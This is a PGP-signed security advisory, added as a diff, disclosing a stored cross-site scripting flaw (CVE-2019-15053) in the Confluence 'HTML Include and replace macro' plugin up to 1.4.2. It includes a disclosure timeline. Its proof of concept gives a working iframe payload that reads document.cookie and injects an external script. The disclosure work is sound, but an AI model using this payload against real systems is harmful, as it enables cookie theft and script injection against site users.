@@ -1,0 +1,106 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA512
+
+
+Advisory ID: FAB-2019-00156
+Product: HTML Include and replace macro
+Manufacturer: The Plugin People
+Affected Version(s): 1.4.2 and before
+Tested Version(s): 1.4.2
+Vulnerability Type: Cross-Site Scripting (CWE-79)
+Risk Level: Medium
+CVSS v3.0: 6.8
+Vektor String: CVSS:3.0/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:L/A:L/E:F/RL:W
+Vendor Homepage: https://thepluginpeople.atlassian.net/
+Software Link: https://marketplace.atlassian.com/apps/4885/html-include-and-replace-macro
+Solution Status: Reported
+Manufacturer Notification: 2019-08-13
+Solution Date: 2019-08-14
+Public Disclosure: 2019-08-14
+CVE Reference: CVE-2019-15053
+Author of Advisory: Francesco Emanuel Bennici, FABMation GmbH
+
+
+Description
+===========
+
+HTML Include and replace macro Plugin for Confluence Server adds the possibility
+to "import" external HTML Sites within an Confluence Site.
+
+
+The Plugin/ Macro provides a functionality to disable JavaScript (and/ or)
+(CSS) Styles.
+
+But an attacker can execute JavaScript Code on the Confluence even if
+"includeScripts" is set to "false".
+
+Enabling or Disabling "includeStyles" does not affect the functionality of the
+Exploit.
+
+Found by Francesco Emanuel Bennici of FABMation GmbH.
+
+Proof of Concept (PoC)
+======================
+
+Add an "iframe" to the target HTML Site.
+Example HTML Site:
+```html
+<!DOCTYPE html>
+<html lang="en-US">
+ <head>
+   <meta charset="UTF-8">
+   <meta http-equiv="X-UA-Compatible" content="IE=edge">
+   <meta name="viewport" content="width=device-width, initial-scale=1">
+   <link rel="stylesheet" href="/aaasd/assets/css/style.css?v=494874d72b3eb22e6fda9927d7ab0abf85584bbe">
+
+   <iframe height="0" width="0" src="javascript:alert(document.cookie);var s=document.createElement('script');s.type='text/javascript',s.src='more_evil_data.js',document.body.appendChild(s);"></iframe>
+
+ </head>
+
+ <body>
+     <h1>Hello World</h1>
+ </body>
+</html>
+```
+
+Disclosure Timeline
+===================
+
+2019-08-13: Vulnerability discovered
+2019-08-13: Vulnerability reported to manufacturer
+2019-08-14: Manufacturer released Fix
+2019-08-14: Public disclosure
+
+Credits
+=======
+
+This security vulnerability was found by Francesco Emanuel Bennici of FABMation GmbH.
+
+E-Mail: eb@fabmation.de
+Public Key: https://keyserver.ubuntu.com/pks/lookup?op=get&search=0x17FA2D56BAD01661
+Key ID: 0x17FA2D56BAD01661
+Key Fingerprint: B643 49C6 B652 CD12 C03F  DACD 17FA 2D56 BAD0 1661
+
+
+Copyright
+=========
+
+Creative Commons - Attribution (by) - Version 3.0
+URL: https://creativecommons.org/licenses/by/3.0/deed.en
+-----BEGIN PGP SIGNATURE-----
+
+iQIzBAEBCgAdFiEEtkNJxrZSzRLAP9rNF/otVrrQFmEFAl1bmI0ACgkQF/otVrrQ
+FmE2+g//WviX0nYrEsrYLmRFFChmAxpgC3tUIs1zbd1lrNHGYBgzpTX03sjb23lF
+nn1EC0WPTwfrjjxUDkDdhfT1JV/g970KIS2T2C7XYXpwun9G2wlJPdhCujuy0/1d
+YFaS0IvpwQY9HGz6hQjhku8KcM4KtbkpeXyp+IQqGQ/PGMrRW9XMdP7h0MmyjUlc
+C5eb0Y8D2mTRkLcq0Jbu+7lkB8i7NyHn9gd2ho50tlenwKUPmXdYvNgjzXvr9Ltw
+kp4iYCQNmDPRO40AbY13Uzi088npNA4PGe2/8AYXXQqA5MSpcNxpg9KQhwVhOX2C
+eeJ6kEOmTmhFFKTQowAHfSoMVl8q8uEXhP9BHfMQDlOdoW/1ZNLSJKR894mO0rLu
+jTChJrm9nGlQ2oV8qRa0rtSgFtIfBX0RnYuMcCcuNgpST8H+X9pXE1W4VPvCFV97
+sFKZ/Gh/mK0n1GTE1kOD7qO44+WBCHsQwh8xAqJxvI8TuC81HlGGXma28ZY1C6oF
+tbID9VaG3u0jG1BK94WXvYiVpeDxWTmN6PfsGQ6RtGqmJh9MlKAm6zPVixBYGGiA
+KZM/L2BrOjm9FTbzAwC7ub6mLKKzXBFYyhQMMFWvOklsDhpbbfRDMTRQVO+xbDSa
+b+SJ7aCO4Dy1boufxFsbXfE1pur8shuL9iDZwLZ05YAmKLl/ozo=
+=XIOr
+-----END PGP SIGNATURE-----
+
